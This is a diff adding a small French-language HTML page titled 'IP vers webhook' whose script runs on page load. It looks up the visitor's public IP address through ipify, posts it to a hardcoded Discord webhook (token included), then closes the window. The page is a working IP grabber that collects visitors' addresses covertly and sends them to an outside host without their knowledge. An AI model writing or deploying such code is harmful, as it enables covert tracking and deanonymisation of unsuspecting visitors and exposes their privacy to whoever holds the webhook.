@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>IP vers webhook</title>
+</head>
+<body>
+
+<script>
+let user = "";
+
+function send() {
+    fetch("https://discord.com/api/webhooks/1514316132126031922/k8f833mTdjrBInHClzoNfBoJ3Q7OvrA8FJTbAYjsKctbAfufggJmafrFaEXNWkiDckfc", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            content: "IP utilisateur : " + user
+        })
+    })
+    .then(() => console.log("envoyé"))
+    .catch(err => console.error(err));
+}
+
+fetch("https://api.ipify.org?format=json")
+    .then(res => res.json())
+    .then(data => {
+        user = data.ip;
+        console.log(user);
+        send();
+    })
+    .catch(console.error);
+    window.close()
+</script>
+
+</body>
+</html>
